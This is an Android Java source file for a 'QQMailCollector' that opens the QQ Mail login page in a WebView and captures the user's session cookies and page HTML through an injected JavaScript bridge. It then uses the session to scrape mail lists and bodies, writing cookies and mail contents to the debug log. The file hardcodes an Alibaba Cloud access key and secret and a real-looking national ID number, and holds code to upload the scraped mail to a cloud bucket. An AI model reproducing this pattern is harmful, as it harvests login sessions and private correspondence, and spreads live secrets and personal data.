package com.hufeiya.personinfocollecter;

import android.content.pm.ApplicationInfo;
import android.graphics.Bitmap;
import android.graphics.Picture;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.util.Log;
import android.webkit.ConsoleMessage;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.alibaba.sdk.android.oss.ClientException;
import com.alibaba.sdk.android.oss.OSS;
import com.alibaba.sdk.android.oss.OSSClient;
import com.alibaba.sdk.android.oss.ServiceException;
import com.alibaba.sdk.android.oss.common.auth.OSSCredentialProvider;
import com.alibaba.sdk.android.oss.common.auth.OSSPlainTextAKSKCredentialProvider;
import com.alibaba.sdk.android.oss.model.PutObjectRequest;
import com.alibaba.sdk.android.oss.model.PutObjectResult;
import com.aliyun.openservices.ons.api.impl.authority.AuthUtil;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.hufeiya.personinfocollecter.beans.Mail;
import com.hufeiya.personinfocollecter.beans.QQMailDetailJson;
import com.hufeiya.personinfocollecter.beans.QQMailJson;
import com.hufeiya.personinfocollecter.utils.TaobaoParser;
import com.hufeiya.personinfocollecter.utils.mail.MailFilter;
import com.hufeiya.personinfocollecter.utils.mail.MailParser;
import com.hufeiya.personinfocollecter.utils.mail.QQMailParser;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.xutils.common.Callback;
import org.xutils.common.util.MD5;
import org.xutils.http.RequestParams;
import org.xutils.x;

import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

/**
 * Created by hufeiya on 16/6/4.
 * Collect Personal Information from TaoBao.
 */
public class QQMailCollector implements Collector{
    private WebView webView;
    private Handler handler;
    private OnCollectedListener onCollectedListener;
    private static final int LOGIN_SUCCESS = 666;
    private static final int READING_MAIL = 667;
    private static final String PAGE_NUM = "pageNum";
    private QQMailParser parser = new QQMailParser();
    private List<QQMailJson> qqMailJsonList = new ArrayList<>();
    private List<QQMailDetailJson> qqMailDetailJsonList = new ArrayList<>();
    private String cookies;
    private String sid;
    private final int MAX_PAGE = 2;
    private int currentPage = 0;
    private boolean firstLogin = true;

    /**
     * Constructor with a webView.
     * @param webView
     * The webView you want your user to login from it.
     */
    public QQMailCollector(WebView webView) {
        this.webView = webView;
        this.handler = new Handler(new Handler.Callback() {
            @Override
            public boolean handleMessage(Message msg) {
                switch (msg.what){
                    case LOGIN_SUCCESS:
                        //onCollectedListener.onProcessMailInfo(0);
                        return true;
                    case READING_MAIL:
                        //onCollectedListener.onProcessMailInfo(msg.getData().getInt(PAGE_NUM));
                }
                return false;
            }
        });
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            WebView.setWebContentsDebuggingEnabled(true);
        }
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                Log.d("fuck","正试图加载url:" + url);
                return false;
            }

            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                Log.d("fuck", "onPageStarted");
                super.onPageStarted(view, url, favicon);
            }

            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                CookieManager cookieManager = CookieManager.getInstance();
                cookies = cookieManager.getCookie(url);
                Log.d("fuck", "cookie: " + cookies);
                view.loadUrl("javascript:window.local_obj.showSource('<head>'+" + "document.getElementsByTagName('html')[0].innerHTML+'</head>','" + url + "');");
            }
        });
        webView.addJavascriptInterface(new InJavaScriptLocalObj(), "local_obj");
    }

    private void getNextPage(){
        if(currentPage > MAX_PAGE){
            //startFetchMailDetails();
            try {
                List<String> jsonList = parseQQMailToJsonForOSS();
                Log.d("fuck","要上传邮件的封数：" + jsonList.size());
                //uploadToOSS(jsonList);
                sendSuccessMessage();

            /*} catch (ClientException e) {
                // 本地异常如网络异常等
                e.printStackTrace();
            } catch (ServiceException e) {
                // 服务异常
                Log.e("RequestId", e.getRequestId());
                Log.e("ErrorCode", e.getErrorCode());
                Log.e("HostId", e.getHostId());
                Log.e("RawMessage", e.getRawMessage());*/
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }else{
            currentPage++;
            RequestParams params = new RequestParams("https://w.mail.qq.com/cgi-bin/mail_list");
            if(qqMailJsonList == null || qqMailJsonList.size() == 0){

            }else{
                QQMailJson last = qqMailJsonList.get(qqMailJsonList.size()-1);
                params.addQueryStringParameter("cursorutc","" + last.getInf().getUTC());
                params.addQueryStringParameter("cursorid",last.getInf().getId());
            }

            params.addHeader("Cookie",cookies);
            params.addQueryStringParameter("ef","js");
            params.addQueryStringParameter("sid",sid);
            params.addQueryStringParameter("t","mobile_data.json");
            params.addQueryStringParameter("s","list");
            params.addQueryStringParameter("cursor","max");
            params.addQueryStringParameter("cursorcount","99");//最大只能是99
            params.addQueryStringParameter("folderid","1");
            params.addQueryStringParameter("device","android");
            params.addQueryStringParameter("app","phone");
            params.addQueryStringParameter("ver","app");
            try {
                String result = x.http().getSync(params,String.class);
                Thread.sleep(1000);
                JSONObject object = new JSONObject(result);
                parseMailJsonObject(object);
                getNextPage();
            } catch (Throwable throwable) {
                throwable.printStackTrace();
            }
        }

    }

    private void parseMailJsonObject(JSONObject object) throws JSONException {
        JSONArray notJsonArray = object.getJSONArray("mls");
        Gson gson = new Gson();
        for(int i = 0;i < notJsonArray.length();i++){
            String raw = notJsonArray.getJSONObject(i).toString();
            QQMailJson qqMailJson = gson.fromJson(raw,QQMailJson.class);
            if (qqMailJson.getInf().getSubj() != null){
                if(MailFilter.isInMailList(qqMailJson.getInf().getFrom().getAddr())){
                    qqMailJsonList.add(qqMailJson);
                    Log.d("fuck"," " + qqMailJsonList.size() + " 邮件标题：" + qqMailJson.getInf().getSubj());
                    Log.d("fuck","发件人：" + qqMailJson.getInf().getFrom().getAddr());
                    String date = timeStamp2Date(String.valueOf(qqMailJson.getInf().getUTC()));
                    Log.d("fuck","时间：" + date);
                    Log.d("fuck","摘要：" + qqMailJson.getInf().getAbs());
                }
            }

        }
    }

    public static String timeStamp2Date(String seconds) {

        if(seconds == null || seconds.isEmpty() || seconds.equals("null")){
            return "";
        }
        String format = "yyyy-MM-dd HH:mm:ss";
        SimpleDateFormat sdf = new SimpleDateFormat(format);
        return sdf.format(new Date(Long.valueOf(seconds+"000")));
    }


    private void startFetchMailDetails(){

        for(int i = 0;i < 10;i++){
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            QQMailJson item = qqMailJsonList.get(i);
            RequestParams params = new RequestParams("https://w.mail.qq.com/cgi-bin/readmail");
            params.addHeader("Cookie",cookies);
            params.addQueryStringParameter("ef","js");
            params.addQueryStringParameter("sid",sid);
            params.addQueryStringParameter("t","mobile_data.json");
            params.addQueryStringParameter("s","read");
            params.addQueryStringParameter("showreplyhead","1");
            params.addQueryStringParameter("disptype","html");
            final Gson gson = new Gson();
            params.addQueryStringParameter("mailid",item.getInf().getId());
            try {
                String result = x.http().getSync(params,String.class);
                Log.d("fuck","邮件详情json：" + result);
                QQMailDetailJson detail = gson.fromJson(result,QQMailDetailJson.class);
                Log.d("fuck","邮件详情摘要:" + detail.getMls().get(0).getInf().getAbs());
                Log.d("fuck","邮件详情:" + detail.getMls().get(0).getContent().getBody());
                qqMailDetailJsonList.add(detail);
            } catch (Throwable throwable) {
                throwable.printStackTrace();
                Log.d("fuck","读取邮件详细信息失败！");
            }
        }
    }

    public void uploadToOSS(List<String> mailsForOSS)throws Exception{
        String endpoint = "oss-cn-shenzhen.aliyuncs.com";

// 明文设置AccessKeyId/AccessKeySecret的方式建议只在测试时使用
        OSSCredentialProvider credentialProvider = new OSSPlainTextAKSKCredentialProvider("4KhwUxAXQxpoIWMl", "J9DqKTqmLnBjQAIoJNlyT3NaBdUYIo");

        OSS oss = new OSSClient(MyApplication.context, endpoint, credentialProvider);
        for(int i = 0;i < mailsForOSS.size();i++){
            PutObjectRequest put = new PutObjectRequest("jinms-crs-rawdata", "330326198601283013/CreditCard/M0TO100/" + i,
                    mailsForOSS.get(i).getBytes());
            PutObjectResult putResult = oss.putObject(put);

            Log.d("PutObject", "UploadSuccess");

            Log.d("ETag", putResult.getETag());
            Log.d("RequestId", putResult.getRequestId());

        }


    }

    public void sendSuccessMessage() throws Throwable{
        String NEWLINE="\n";
        String bodyCotent = "{\"idCard\":\"330326198601283013\",\"dataCode\":\"utf-8\",\"moduleNames\":[\"M0TO100\"]}";
        String topic = "TPC_DEV_CRS_ORIGINAL_DATA";
        String pid = "PID_DEV_CRS_ORIGINAL_DATA";
        String md5Body = stringToMD5(bodyCotent);
        String date = String.valueOf(new Date().getTime());
        String signString=topic + "\n" + pid + "\n" + md5Body + "\n" +date;
        String sign = AuthUtil.calSignature(signString.getBytes(Charset.forName("UTF-8")),"J9DqKTqmLnBjQAIoJNlyT3NaBdUYIo");
        RequestParams params = new RequestParams("http://publictest-rest.ons.aliyun.com/message/" +
                "?topic="+topic+"&time=" +date + "&tag=http"+"&key=http");
        params.setHeader("AccessKey","4KhwUxAXQxpoIWMl");
        params.setHeader("Signature",sign);
        params.setHeader("ProducerID",pid);

        params.setBodyContent(bodyCotent);
        String result = x.http().postSync(params,String.class);

        Log.d("fuck","消息发送结果:" + result);
    }

    private List<String> parseQQMailToJsonForOSS(){
        List<String> jsonList = new ArrayList<>();
        Gson gson = new Gson();
        for(QQMailDetailJson qqMail : qqMailDetailJsonList){
            Mail mail = new Mail();
            mail.setSubject(qqMail.getMls().get(0).getInf().getSubj());
            mail.setSender(qqMail.getMls().get(0).getInf().getFrom().getAddr());
            mail.setSendTime(String.valueOf(qqMail.getMls().get(0).getInf().getDate()));
            mail.setContent(qqMail.getMls().get(0).getContent().getBody());
            String mailJson = gson.toJson(mail);
            jsonList.add(mailJson);
        }
        return jsonList;
    }



    class InJavaScriptLocalObj {
        @JavascriptInterface
        public void showSource(String html,String url) {
            Log.d("fuck","包含退出:" + html.contains("退出"));
            // Indicate the user already login the mobile version qq mail.
            if (html.contains("退出") && firstLogin) {
                firstLogin = false;
                Log.d("fuck","邮箱登录成功,url:" +url);
                Message message = new Message();
                message.what = LOGIN_SUCCESS;
                handler.dispatchMessage(message);
                String tempSid = parser.getSidFromURL(url);
                if(tempSid != null){
                    sid = tempSid;
                }
                getNextPage();
            }
        }
    }

    @Override
    public void startCollection(OnCollectedListener listener) {
        webView.loadUrl("https://mail.qq.com/cgi-bin/loginpage");
        onCollectedListener = listener;
    }

    public static String stringToMD5(String string) {
        byte[] hash;

        try {
            hash = MessageDigest.getInstance("MD5").digest(string.getBytes("UTF-8"));
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return null;
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }

        StringBuilder hex = new StringBuilder(hash.length * 2);
        for (byte b : hash) {
            if ((b & 0xFF) < 0x10)
                hex.append("0");
            hex.append(Integer.toHexString(b & 0xFF));
        }

        return hex.toString();
    }
}
